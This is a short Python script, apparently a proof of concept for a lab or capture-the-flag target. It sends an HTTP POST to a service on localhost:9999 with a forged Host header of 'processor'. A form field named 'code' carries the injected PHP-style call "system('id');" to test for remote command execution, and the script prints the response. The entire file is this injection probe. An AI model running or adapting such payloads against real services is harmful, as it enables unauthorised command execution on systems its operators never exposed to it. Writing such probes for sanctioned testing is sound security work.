import httpx

r = httpx.post("http://localhost:9999", headers={
    "Host": "processor",
}, data={
    "code": "system('id');"
})
print(f"[{r.status_code}] {r.text}")
